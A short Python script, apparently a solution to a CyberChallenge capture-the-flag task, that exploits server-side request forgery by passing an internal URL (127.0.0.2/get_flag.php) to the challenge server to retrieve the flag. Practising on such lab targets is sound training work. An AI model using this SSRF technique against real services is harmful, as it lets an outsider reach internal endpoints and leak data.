import requests
from urllib.parse import quote

url = 'http://ssrf2.challs.cyberchallenge.it/'
params = {
        'url' : 'http://127.0.0.2/get_flag.php'
        } 
resp = requests.get(url, params=params)
print(resp.text)